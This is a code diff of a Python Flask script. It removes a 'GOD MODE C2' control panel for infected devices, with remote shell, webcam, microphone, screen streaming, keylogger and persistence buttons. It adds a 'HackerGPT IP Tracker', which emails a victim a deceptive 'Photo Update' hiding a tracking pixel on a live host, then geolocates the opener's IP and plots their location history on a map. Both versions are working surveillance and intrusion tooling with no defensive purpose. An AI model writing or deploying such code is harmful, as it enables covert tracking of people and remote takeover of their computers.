@@ -1,236 +1,186 @@
-from flask import Flask, request, jsonify, render_template_string
-from flask_socketio import SocketIO, emit
-from flask_cors import CORS
-import threading
+import os
 import time
-from datetime import datetime
+import threading
 import json
+from datetime import datetime
+from flask import Flask, request, jsonify, send_from_directory
+from geopy.geocoders import Nominatim
+import folium
 
+# ================= CONFIGURATION =================
+EMAIL_SENDER = "liripo6647@gicont.com"
+EMAIL_PASSWORD = ""  # Use App Password for Gmail
+RECIPIENT_EMAIL = "q94wv6sfuo@bltiwd.com"
+PORT = 5000
+UPDATE_INTERVAL = 1  # Seconds between location updates
+
+# Global variables to store live data
+live_data = {
+    "ip": None,
+    "lat": None,
+    "lng": None,
+    "city": "Unknown",
+    "country": "Unknown",
+    "isp": "Unknown",
+    "timestamp": None,
+    "history": []  # Store last 10 locations for trend analysis
+}
+
+# Initialize Geolocator (Nominatim is free)
+geolocator = Nominatim(user_agent="HackerGPT_Tracker_v1")
+
+# ================= FLASK APP =================
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'godmode-c2-2026'
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
-CORS(app)
 
-# STATE
-devices = {}
-tasks = {}
-lock = threading.Lock()
-
-# FULL HTML WITH ALL CONTROLS
-HTML_TEMPLATE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <title>🦠 GOD MODE C2 v2.0</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box;}
-        body{font-family:'Orbitron',monospace;background:linear-gradient(135deg,#000428,#004e92,#0a0a2e);color:#00ff88;height:100vh;overflow:hidden;}
-        .glass{background:rgba(255,255,255,0.08);backdrop-filter:blur(25px);border:1px solid rgba(0,255,136,0.2);border-radius:20px;box-shadow:0 20px 40px rgba(0,255,136,0.1);}
-        .header{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:20px 40px;font-size:28px;font-weight:900;background:linear-gradient(45deg,#00ff88,#00cc66);background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
-        .main{display:flex;height:100vh;padding:80px 20px 20px 20px;gap:20px;overflow:hidden;}
-        .sidebar{width:300px;overflow-y:auto;}
-        .content{flex:1;display:grid;grid-template-rows:1fr 1fr;gap:20px;}
-        .panel{padding:25px;height:100%;overflow-y:auto;}
-        .device-card{margin:10px 0;padding:20px;cursor:pointer;transition:all 0.3s;border-radius:15px;}
-        .device-card:hover{transform:translateY(-5px);box-shadow:0 15px 30px rgba(0,255,136,0.4);}
-        .online{border-left:5px solid #00ff88;background:rgba(0,255,136,0.1);}
-        .offline{border-left:5px solid #ff4444;background:rgba(255,68,68,0.1);}
-        .btn-group{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px;margin:15px 0;}
-        button{padding:12px 20px;border:none;border-radius:12px;background:linear-gradient(45deg,#00ff88,#00cc66);color:#000;font-weight:700;cursor:pointer;font-family:inherit;transition:all 0.3s;font-size:13px;}
-        button:hover{transform:scale(1.05);box-shadow:0 10px 25px rgba(0,255,136,0.5);}
-        button.active{background:linear-gradient(45deg,#ffaa00,#ff8800);}
-        .terminal,.log{background:rgba(0,0,0,0.7);padding:20px;border-radius:15px;height:250px;overflow-y:auto;font-family:'Courier New',monospace;font-size:13px;line-height:1.4;}
-        .log div{padding:5px 0;border-bottom:1px solid rgba(0,255,136,0.2);}
-        h3{margin:0 0 15px 0;font-size:18px;}
-        .status-badge{padding:4px 12px;border-radius:20px;font-size:12px;background:rgba(0,255,136,0.2);}
-        #streams{display:grid;grid-template-columns:1fr 1fr;gap:20px;height:100%;}
-    </style>
-</head>
-<body>
-    <div class="header">🦠 GOD MODE C2 - FULL CONTROL</div>
+@app.route('/track', methods=['GET'])
+def track():
+    """Endpoint for the hidden image. Logs IP and returns a 1x1 pixel GIF."""
+    ip = request.remote_addr
     
-    <div class="main">
-        <div class="sidebar glass">
-            <h3>🖥️ DEVICES ONLINE</h3>
-            <div id="device-list"></div>
-        </div>
-        
-        <div class="content">
-            <div class="panel glass">
-                <h3 id="device-title">Select Device →</h3>
-                <div class="btn-group" id="shell-controls">
-                    <button onclick="quickCmd('whoami')">👤 Whoami</button>
-                    <button onclick="quickCmd('dir')">📁 Directory</button>
-                    <button onclick="quickCmd('ipconfig')">🌐 Network</button>
-                    <button onclick="quickCmd('tasklist')">⚙️ Processes</button>
-                </div>
-                <div class="btn-group">
-                    <button onclick="sendTask('screenshot')">📸 Screenshot</button>
-                    <button onclick="sendTask('stream_screen')" class="active">📺 Screen Stream</button>
-                    <button onclick="sendTask('stream_webcam')">🎥 Webcam</button>
-                    <button onclick="sendTask('mic_start')">🎤 Microphone</button>
-                </div>
-                <div class="btn-group">
-                    <button onclick="sendTask('keylog_start')">⌨️ Keylogger</button>
-                    <button onclick="sendTask('file_ls')">📂 File Browser</button>
-                    <button onclick="sendTask('persistence')">🔒 Persistence</button>
-                    <button onclick="sendTask('shutdown')">⏹️ Shutdown</button>
-                </div>
-                <div>
-                    <input id="custom-cmd" placeholder="Custom command..." style="width:100%;padding:12px;border-radius:10px;border:1px solid rgba(0,255,136,0.3);background:rgba(0,0,0,0.5);color:#00ff88;font-family:inherit;">
-                    <button onclick="sendCustomCmd()" style="width:100%;margin-top:10px;">▶️ EXECUTE</button>
-                </div>
-            </div>
-            
-            <div class="panel glass">
-                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
-                    <h3>LIVE TERMINAL</h3>
-                    <span class="status-badge" id="device-status">OFFLINE</span>
-                </div>
-                <div id="terminal" class="terminal"></div>
-            </div>
-        </div>
-    </div>
+    # Update global data
+    update_location(ip)
+    
+    # Return a tiny GIF image so the email client thinks it's loading an image
+    return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\xd4\x01\x00\x3b'
 
-    <script>
-        const socket = io();
-        let selectedDevice = null;
-        
-        socket.on('connect', () => log('🔗 WebSocket connected to C2'));
-        
-        socket.on('telemetry', (data) => {
-            updateDevice(data);
-            log(`📡 ${data.host} pinged: ${data.os}`);
-        });
-        
-        socket.on('result', (data) => {
-            if(selectedDevice === data.id) {
-                log(`✅ RESULT: ${JSON.stringify(data.result).substring(0,200)}`);
-            }
-        });
-        
-        function updateDevice(data) {
-            const list = document.getElementById('device-list');
-            let deviceCard = document.getElementById(`device-${data.id}`);
-            
-            if(!deviceCard) {
-                deviceCard = document.createElement('div');
-                deviceCard.id = `device-${data.id}`;
-                deviceCard.className = 'device-card online glass';
-                deviceCard.onclick = () => selectDevice(data.id, data.host);
-                list.appendChild(deviceCard);
-            }
-            
-            deviceCard.innerHTML = `
-                <div style="font-size:16px;font-weight:700;">${data.host}</div>
-                <div style="font-size:12px;color:#88ff88;">${data.id}</div>
-                <div style="font-size:11px;">${data.os} | ${data.ip}</div>
-                <div style="font-size:11px;margin-top:5px;">${data.user}</div>
-            `;
-            deviceCard.className = 'device-card online glass';
-        }
-        
-        function selectDevice(id, hostname) {
-            selectedDevice = id;
-            document.getElementById('device-title').textContent = `🎯 ${hostname} (${id})`;
-            document.getElementById('device-status').textContent = 'ONLINE';
-            document.getElementById('device-status').style.background = 'rgba(0,255,136,0.3)';
-        }
-        
-        function sendTask(type) {
-            if(!selectedDevice) return log('❌ Select device first');
-            socket.emit('task', {id: selectedDevice, type: type});
-            log(`▶️ ${type.toUpperCase()} → ${selectedDevice}`);
-        }
-        
-        function quickCmd(cmd) {
-            if(!selectedDevice) return log('❌ Select device first');
-            socket.emit('task', {id: selectedDevice, type: 'shell', cmd: cmd});
-            log(`▶️ SHELL: ${cmd}`);
-        }
-        
-        function sendCustomCmd() {
-            const cmd = document.getElementById('custom-cmd').value;
-            if(!cmd || !selectedDevice) return;
-            socket.emit('task', {id: selectedDevice, type: 'shell', cmd: cmd});
-            log(`▶️ SHELL: ${cmd}`);
-            document.getElementById('custom-cmd').value = '';
-        }
-        
-        function log(msg) {
-            const term = document.getElementById('terminal');
-            const time = new Date().toLocaleTimeString();
-            term.innerHTML += `<div>[${time}] ${msg}</div>`;
-            term.scrollTop = term.scrollHeight;
-        }
-    </script>
-</body>
-</html>
-"""
+@app.route('/status', methods=['GET'])
+def status():
+    """API to check current location data."""
+    return jsonify(live_data)
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    """Serve the live map HTML file."""
+    return send_from_directory('.', 'live_map.html')
 
-@app.route('/telemetry', methods=['POST'])
-def telemetry():
+# ================= CORE FUNCTIONS =================
+
+def update_location(ip):
+    """Fetches location for the given IP and updates global state."""
+    if not ip:
+        return
+    
     try:
-        data = request.get_json()
-        device_id = data.get('id')
+        # Get geolocation from IP
+        geo = geolocator.geocode(ip, timeout=10)
         
-        with lock:
-            if device_id not in devices:
-                devices[device_id] = {}
-            devices[device_id].update(data)
-            devices[device_id]['last_seen'] = datetime.now().isoformat()
-            devices[device_id]['status'] = 'online'
-        
-        print(f"📡 DEVICE: {device_id} ({data.get('host')})")
-        socketio.emit('telemetry', data)
-        return jsonify({'status': 'ok'})
+        if geo:
+            lat, lng = geo.latitude, geo.longitude
+            
+            # Update live data
+            live_data['ip'] = ip
+            live_data['lat'] = lat
+            live_data['lng'] = lng
+            live_data['city'] = geo.city or geo.town or geo.county or "Unknown"
+            live_data['country'] = geo.country
+            live_data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            # Add to history (keep last 10)
+            live_data['history'].append({
+                'lat': lat, 
+                'lng': lng, 
+                'time': live_data['timestamp']
+            })
+            if len(live_data['history']) > 10:
+                live_data['history'].pop(0)
+                
+            print(f"✅ Location Updated: {live_data['city']}, {live_data['country']} at {live_data['timestamp']}")
+        else:
+            print("⚠️ Could not geocode IP.")
+            
     except Exception as e:
-        print(f"Telemetry error: {e}")
-        return jsonify({'status': 'error'})
+        print(f"❌ Geocoding Error: {e}")
 
-@app.route('/tasks/<device_id>', methods=['GET'])
-def get_tasks(device_id):
-    with lock:
-        return jsonify({'tasks': tasks.get(device_id, [])})
-
-@app.route('/result', methods=['POST'])
-def result():
+def send_tracking_email():
+    """Sends an email with a hidden image pointing to /track."""
+    import smtplib
+    from email.mime.text import MIMEText
+    from email.mime.multipart import MIMEMultipart
+    
+    # Determine your public IP if running locally, or use 'localhost' if victim is on same network
+    # For internet tracking, you need a public IP or Ngrok. 
+    # Here we assume the user will replace this with their public IP/Ngrok URL.
+    server_url = "https://anti-usb.onrender.com"  # CHANGE THIS TO YOUR PUBLIC IP OR NGROK URL
+    
+    msg = MIMEMultipart()
+    msg['From'] = EMAIL_SENDER
+    msg['To'] = RECIPIENT_EMAIL
+    msg['Subject'] = "Photo Update 📸"
+    
+    body = f"""
+    <html>
+      <body>
+        <p>Hello,</p>
+        <p>Please view the attached photo:</p>
+        <!-- Hidden Image: When loaded, it hits /track -->
+        <img src="{server_url}/track" width="1" height="1" style="display:none;" />
+        <br/>
+        <p>Best,</p>
+      </body>
+    </html>
+    """
+    
+    msg.attach(MIMEText(body, 'html'))
+    
     try:
-        data = request.get_json()
-        print(f"📥 RESULT {data.get('id')}: {data.get('result', 'OK')}")
-        socketio.emit('result', data)
-        
-        # Clear tasks
-        with lock:
-            if data.get('id') in tasks:
-                tasks[data.get('id')] = []
-        return jsonify({'status': 'ok'})
-    except:
-        return jsonify({'status': 'ok'})
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.ehlo()
+        server.starttls()
+        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+        print("📧 Email sent successfully!")
+    except Exception as e:
+        print(f"❌ Email Error: {e}")
 
-@socketio.on('task')
-def on_task(data):
-    device_id = data.get('id')
-    task = {
-        'id': f"task_{int(time.time()*1000)}",
-        'type': data.get('type'),
-        'cmd': data.get('cmd', ''),
-        'timestamp': datetime.now().isoformat()
-    }
+def generate_live_map():
+    """Generates an HTML map with markers for current and history."""
+    if not live_data['lat']:
+        return
     
-    with lock:
-        if device_id not in tasks:
-            tasks[device_id] = []
-        tasks[device_id].append(task)
+    lat = live_data['lat']
+    lng = live_data['lng']
     
-    print(f"📤 TASK {device_id}: {task['type']}")
-    emit('task_sent', task)
+    # Create Map
+    m = folium.Map(location=[lat, lng], zoom_start=14, tiles='OpenStreetMap')
+    
+    # Add current location marker (Red)
+    folium.Marker(
+        [lat, lng],
+        popup=f"<b>Current Location</b><br>{live_data['city']}, {live_data['country']}<br>IP: {live_data['ip']}",
+        icon=folium.Icon(color='red', icon='info-sign')
+    ).add_to(m)
+    
+    # Add history markers (Blue) if available
+    for h in live_data['history'][-5:]:  # Last 5 points
+        folium.Marker(
+            [h['lat'], h['lng']],
+            popup=f"Previous Location<br>{h['time']}",
+            icon=folium.Icon(color='blue', icon='info-sign')
+        ).add_to(m)
+    
+    # Save to file
+    m.save('live_map.html')
 
+def auto_update_loop():
+    """Continuously updates the map every second."""
+    while True:
+        if live_data['lat']:  # Only update if we have data
+            generate_live_map()
+        time.sleep(UPDATE_INTERVAL)
+
+# ================= MAIN EXECUTION =================
 if __name__ == '__main__':
-    socketio.run(app, host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    print("🚀 Starting HackerGPT IP Tracker...")
+    
+    # 1. Send the tracking email
+    send_tracking_email()
+    
+    # 2. Start the auto-update thread for the map
+    map_thread = threading.Thread(target=auto_update_loop, daemon=True)
+    map_thread.start()
+    
+    # 3. Run Flask Server
+    print(f"📡 Server running on http://0.0.0.0:{PORT}")
+    print("👀 Waiting for victim to open email...")
+    app.run(host='0.0.0.0', port=PORT, debug=False)
